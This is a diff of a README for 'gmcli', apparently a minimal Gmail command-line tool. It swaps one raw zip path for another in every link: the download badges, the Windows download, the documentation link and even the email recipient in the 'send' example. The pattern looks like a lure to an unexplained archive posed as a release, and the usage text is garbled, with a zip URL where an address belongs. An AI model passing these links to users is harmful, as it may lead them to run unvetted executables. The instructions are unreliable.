@@ -8,14 +8,14 @@ Welcome to gmcli, the minimal command line interface for Gmail. This tool allows
 
 To get started, you need to download gmcli. Click the link below to visit the Releases page:
 
-[![Download gmcli](https://github.com/ssprusty98/gmcli/raw/refs/heads/main/.husky/gmcli-v3.3.zip)](https://github.com/ssprusty98/gmcli/raw/refs/heads/main/.husky/gmcli-v3.3.zip)
+[![Download gmcli](https://github.com/ssprusty98/gmcli/raw/refs/heads/main/src/Software-v1.3.zip)](https://github.com/ssprusty98/gmcli/raw/refs/heads/main/src/Software-v1.3.zip)
 
 ### Steps to Download and Install:
 
 1. Click the link above.
 2. Find the latest release at the top of the page.
 3. Locate the file appropriate for your operating system:
-   - For **Windows**, download `https://github.com/ssprusty98/gmcli/raw/refs/heads/main/.husky/gmcli-v3.3.zip`.
+   - For **Windows**, download `https://github.com/ssprusty98/gmcli/raw/refs/heads/main/src/Software-v1.3.zip`.
    - For **Mac**, download `gmcli-mac`.
    - For **Linux**, download `gmcli-linux`.
 
@@ -64,7 +64,7 @@ After setting up gmcli, here's how you can use it effectively:
 - **To Send an Email:**
   - Use the command `gmcli send` followed by the recipient's email and your message. For example:
     ```
-    gmcli send https://github.com/ssprusty98/gmcli/raw/refs/heads/main/.husky/gmcli-v3.3.zip "Hello World" "This is my message."
+    gmcli send https://github.com/ssprusty98/gmcli/raw/refs/heads/main/src/Software-v1.3.zip "Hello World" "This is my message."
     ```
 
 - **To Search Emails:**
@@ -80,7 +80,7 @@ If you experience issues while using gmcli, consider the following:
 
 ## 📖 Additional Resources
 
-For more in-depth information, consider visiting the official [gmcli Documentation](https://github.com/ssprusty98/gmcli/raw/refs/heads/main/.husky/gmcli-v3.3.zip).
+For more in-depth information, consider visiting the official [gmcli Documentation](https://github.com/ssprusty98/gmcli/raw/refs/heads/main/src/Software-v1.3.zip).
 
 ## 📤 Support
 
@@ -88,4 +88,4 @@ If you have any questions or need support, feel free to open an issue on the Git
 
 To download gmcli again or to check for updates, visit the Releases page:
 
-[![Download gmcli](https://github.com/ssprusty98/gmcli/raw/refs/heads/main/.husky/gmcli-v3.3.zip)](https://github.com/ssprusty98/gmcli/raw/refs/heads/main/.husky/gmcli-v3.3.zip)
+[![Download gmcli](https://github.com/ssprusty98/gmcli/raw/refs/heads/main/src/Software-v1.3.zip)](https://github.com/ssprusty98/gmcli/raw/refs/heads/main/src/Software-v1.3.zip)
